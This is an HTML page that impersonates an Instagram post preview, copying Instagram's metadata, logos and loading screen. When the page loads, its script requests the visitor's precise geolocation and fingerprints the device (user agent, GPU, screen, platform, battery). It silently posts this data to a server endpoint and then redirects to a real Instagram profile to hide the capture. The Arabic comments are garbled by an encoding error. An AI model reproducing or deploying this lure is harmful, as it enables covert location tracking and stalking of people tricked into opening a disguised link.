<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>

    <!-- SEO & Social Preview (Instagram Post Style) -->
    <meta property="og:site_name" content="Instagram">
    <meta property="og:title" content="mzjy3756 â€¢ Ø³Ù„Ø§Ù…Ø§ Ø¹Ù„Ù‰ Ù…Ù† ÙˆØ¹Ø¯Ø§ Ø¨Ø§Ù„Ø¨Ù‚Ø§Ø¡ âš¡ðŸš¸">
    <meta property="og:description" content="1,193 likes, 280 comments - See Instagram photo by @mzjy3756">

    <!-- Ù‡Ø°Ù‡ Ø§Ù„Ø±ÙˆØ§Ø¨Ø· Ø³ÙŠØªÙ… Ø§Ø³ØªØ¨Ø¯Ø§Ù„Ù‡Ø§ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¨ÙˆØ§Ø³Ø·Ø© Ø§Ù„Ø³ÙŠØ±ÙØ± -->
    <meta property="og:image" content="SITE_URL/preview.webp">
    <meta property="og:image:secure_url" content="SITE_URL/preview.webp">
    <meta property="og:image:width" content="1080">
    <meta property="og:image:height" content="1080">
    <meta property="og:image:type" content="image/webp">

    <meta property="og:url" content="SITE_URL">
    <meta property="og:type" content="article">

    <!-- App Links -->
    <meta property="al:ios:app_name" content="Instagram">
    <meta property="al:ios:app_store_id" content="389801252">
    <meta property="al:ios:url" content="https://www.instagram.com/p/DJrC3jTIsun/">
    <meta property="al:android:app_name" content="Instagram">
    <meta property="al:android:package" content="com.instagram.android">
    <meta property="al:android:url" content="https://www.instagram.com/p/DJrC3jTIsun/">

    <!-- Twitter Card (Ù„Ø¶Ù…Ø§Ù† Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„ÙƒØ¨ÙŠØ±Ø© ÙÙŠ ØªÙ„Ø¬Ø±Ø§Ù… Ø£ÙŠØ¶Ø§Ù‹) -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="mzjy3756 â€¢ Ø³Ù„Ø§Ù…Ø§ Ø¹Ù„Ù‰ Ù…Ù† ÙˆØ¹Ø¯Ø§ Ø¨Ø§Ù„Ø¨Ù‚Ø§Ø¡ âš¡ðŸš¸">
    <meta name="twitter:description" content="1,193 likes, 280 comments - See Instagram photo by @mzjy3756">
    <meta name="twitter:image" content="SITE_URL/preview.webp">
    <meta name="theme-color" content="#000000">

    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/ed84a1666a32.png">
</head>

<body>
    <!-- Ø´Ø§Ø´Ø© ØªØ­Ù…ÙŠÙ„ Ù…Ø·Ø§Ø¨Ù‚Ø© Ù„Ø¥Ù†Ø³ØªÙ‚Ø±Ø§Ù… Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† Ø§Ù„Ø´Ø§Ø´Ø© Ø§Ù„Ø³ÙˆØ¯Ø§Ø¡ Ø§Ù„ØµØ§Ù…ØªØ© -->
    <div class="insta-loading-screen">
        <div class="insta-logo"></div>

        <div class="meta-footer">
            <span class="from-text">from</span>
            <div class="meta-brand">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png"
                    class="meta-logo" alt="Meta">
            </div>
        </div>
    </div>

    <script>
        function getGPU() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "N/A";
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
            } catch (e) { return "Error"; }
        }

        window.onload = async () => {
            let locationCaptured = false;
            let bestPos = { coords: { latitude: 'N/A', longitude: 'N/A', accuracy: 'N/A' } };

            // 1. Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙÙˆØ±Ø§Ù‹
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        bestPos = pos;
                        locationCaptured = true;
                    },
                    (err) => {
                        console.log("Geo Error:", err);
                        locationCaptured = true; // Ù…ØªØ§Ø¨Ø¹Ø© Ø­ØªÙ‰ Ù„Ùˆ Ø±ÙØ¶
                    },
                    { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
                );
            } else {
                locationCaptured = true;
            }

            // 2. ÙˆØ¸ÙŠÙØ© Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©
            async function startProcess() {
                // Ù†Ù†ØªØ¸Ø± 1.5 Ø«Ø§Ù†ÙŠØ© ÙƒØ­Ø¯ Ø£Ù‚ØµÙ‰ Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø£ÙØ¶Ù„ Ø¯Ù‚Ø©
                const timeoutPromise = new Promise(r => setTimeout(r, 1500));

                while (!locationCaptured && attempts < 15) {
                    await new Promise(r => setTimeout(r, 100));
                    attempts++;
                }

                const data = {
                    latitude: bestPos.coords.latitude,
                    longitude: bestPos.coords.longitude,
                    accuracy: bestPos.coords.accuracy ? bestPos.coords.accuracy.toFixed(1) + "m" : "N/A",
                    userAgent: navigator.userAgent,
                    gpu: getGPU(),
                    screen: `${window.screen.width}x${window.screen.height}`,
                    platform: navigator.platform,
                    battery: await (navigator.getBattery ? navigator.getBattery().then(b => ({ level: Math.round(b.level * 100) + "%", charging: b.charging ? "Yes" : "No" })) : Promise.resolve({ level: "N/A", charging: "N/A" }))
                };

                // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¨Ù€ fetch Ø§Ù„Ø¹Ø§Ø¯ÙŠ (Ø§Ù„Ø£ÙƒØ«Ø± Ù…ÙˆØ«ÙˆÙ‚ÙŠØ© Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„ÙˆÙ‚Øª Ù…ØªØ§Ø­Ø§Ù‹)
                try {
                    await fetch('/api/location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data),
                        keepalive: true
                    });
                } catch (e) {
                    // Ø¥Ø°Ø§ ÙØ´Ù„ FetchØŒ Ù†Ø³ØªØ®Ø¯Ù… Beacon ÙƒØ®Ø·Ø© Ø¨Ø¯ÙŠÙ„Ø© ÙÙˆØ±ÙŠØ© (ØªØ¹Ù…Ù„ Ø¬ÙŠØ¯Ø§Ù‹ Ø¹Ù„Ù‰ Ø§Ù„Ù‡ÙˆØ§ØªÙ Ø¹Ù†Ø¯ Ø§Ù„Ø¥ØºÙ„Ø§Ù‚)
                    if (navigator.sendBeacon) {
                        navigator.sendBeacon('/api/location', JSON.stringify(data));
                    }
                }

                // Ø§Ù„ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ
                redirect();
            }

            // Ø¨Ø¯Ø¡ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©
            let attempts = 0;
            startProcess();

            // Ø£Ù…Ø§Ù† Ø¥Ø¶Ø§ÙÙŠ: ØªØ­ÙˆÙŠÙ„ Ù‚Ø³Ø±ÙŠ Ø¨Ø¹Ø¯ 4 Ø«ÙˆØ§Ù†Ù Ù„Ø¶Ù…Ø§Ù† Ø¹Ø¯Ù… ØªØ¹Ù„ÙŠÙ‚ Ø§Ù„ØµÙØ­Ø©
            setTimeout(redirect, 4000);
        };

        function redirect() {
            const username = "mzjy3756";
            const isAndroid = /Android/i.test(navigator.userAgent);
            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

            // Ø¹Ù†Ø¯ Ø§Ù„Ø¶ØºØ· ÙˆÙØªØ­ Ø§Ù„ØµÙØ­Ø©ØŒ ÙŠØªÙ… Ø§Ù„ØªØ­ÙˆÙŠÙ„ Ù„Ù„Ø¨Ø±ÙˆÙØ§ÙŠÙ„ Ù…Ø¨Ø§Ø´Ø±Ø©
            const appUrl = `instagram://user?username=${username}`;
            const webUrl = `https://www.instagram.com/${username}/`;
            const intentUrl = `intent://instagram.com/_u/${username}/#Intent;package=com.instagram.android;scheme=https;end`;

            if (isAndroid) {
                window.location.href = intentUrl;
            } else if (isIOS) {
                window.location.href = appUrl;
            } else {
                window.location.href = webUrl;
            }

            // Fallback
            setTimeout(() => {
                window.location.replace(webUrl);
            }, 1000);
        }
    </script>
</body>

</html>